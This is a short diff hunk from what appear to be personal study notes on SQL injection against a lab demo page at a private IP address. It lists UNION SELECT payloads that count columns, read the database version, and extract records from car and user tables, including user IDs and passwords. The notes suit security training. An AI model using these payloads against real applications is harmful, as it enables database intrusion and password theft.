@@ -230,8 +230,8 @@ http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3#
                                   
 custom query                    Selection=2 UNION select name,type,cost from session.car;#
                                 Selection=2 UNION select id,pass,name from session.user;#
-
-
+                                Selection=2 UNION select 1,2,@@version
+                                
 
 ****SQL by the numbers:
         Browse website as normal & find input fields + variables
